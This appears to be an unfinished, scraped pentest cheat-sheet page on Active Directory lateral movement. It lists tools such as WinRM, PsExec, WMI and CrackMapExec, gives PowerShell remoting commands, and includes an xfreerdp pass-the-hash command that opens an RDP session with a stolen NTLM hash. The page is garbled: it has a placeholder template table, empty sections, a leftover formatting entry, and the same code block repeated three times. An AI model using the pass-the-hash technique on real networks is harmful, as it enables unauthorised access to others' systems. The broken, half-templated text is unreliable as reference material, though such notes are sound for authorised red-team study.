

## Content

**[1. Active Directory Lateral Movement](#heading--1)**

  * [1.1. Understand Lateral Movement in Windows](#heading--1-1)
  * [1.2. What can we use to Move laterally?](#heading--1-2)

**[2. Move laterally](#heading--2)**

  * [2.1. Using PowerShell](#powershell-remoting)

      * [2.1.1. Not so basic text formatting](#heading--2-1-1)

  * [2.2. Windows Services](#heading--2-2)
  * [2.3. Abusing Remote Desktop Protocol - RDP](#heading--2-3)

----
https://ad.popdocs.net/LateralMovement/
# Active Directory Lateral Movement

| TTP         | Description |
| ----------- | ----------- |
| Header      | Title       |
| Paragraph   | Text        |

## Understand Lateral Movement in Windows


## What can we use to Move laterally?





- Windows Services
- WinRM
- PsExec
- RDP
- WMI
- DCOM
- Webclient
- CrackMapExec
- MSSQL


## Windows Services



## PowerShell Remoting
Enable PowerShell Remoting on current Machine (Needs Admin Access)

```powershell
Enable-PSRemoting
```

Entering or Starting a new PSSession (Needs Admin Access)

```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

## Abusing Remote Desktop Protocol - RDP

If we have a NTLM hash we can have an RDP session

### xFreeRDP

```bash
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```


```powershell
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```





